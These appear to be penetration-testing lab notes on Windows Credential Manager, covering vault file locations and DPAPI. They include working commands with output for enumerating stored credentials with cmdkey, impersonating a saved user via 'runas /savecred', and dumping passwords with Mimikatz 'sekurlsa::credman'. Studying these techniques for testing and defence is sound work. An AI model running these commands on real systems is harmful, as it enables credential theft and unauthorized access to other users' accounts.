[Credential Manager](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication#windows-vault-and-credential-manager) is a feature built into Windows since `Server 2008 R2` and `Windows 7`

special encrypted folders
- `%UserProfile%\AppData\Local\Microsoft\Vault\`
- `%UserProfile%\AppData\Local\Microsoft\Credentials\`
- `%UserProfile%\AppData\Roaming\Microsoft\Vault\`
- `%ProgramData%\Microsoft\Vault\`
- `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`

each vault folder contains a `Policy.vpol` file with AES keys (AES-128 or AES-256) that is protected by DPAPI
newer versions of Windows make use of `Credential Guard` to further protect the DPAPI master keys by storing them in secured memory enclaves ([Virtualization-based Security](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs))

---
cmdkey - enumerating credentials stored in the user's profile
```
C:\Users\sadams>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```

the second credential, `Domain:interactive=SRV01\mcharles`, is a domain credential associated with the user SRV01\mcharles.
`Interactive` means that the credential is used for interactive logon sessions. 
whenever we come across this type of credential, we can use `runas` to impersonate the stored user like so:
```
C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
Attempting to start cmd as user "SRV01\mcharles" ...
```

---
extracting credentials with **Mimikatz**
https://github.com/gentilkiwi/mimikatz

```
C:\Users\Administrator\Desktop> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman

...SNIP...

Authentication Id : 0 ; 630472 (00000000:00099ec8)
Session           : RemoteInteractive from 3
User Name         : mcharles
Domain            : SRV01
Logon Server      : SRV01
Logon Time        : 4/27/2025 2:40:32 AM
SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
        credman :
         [00000000]
         * Username : mcharles@inlanefreight.local
         * Domain   : onedrive.live.com
         * Password : ...SNIP...

...SNIP...
```

Some other tools which may be used to enumerate and extract stored credentials included [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI), [LaZagne](https://github.com/AlessandroZ/LaZagne), and [DonPAPI](https://github.com/login-securite/DonPAPI).

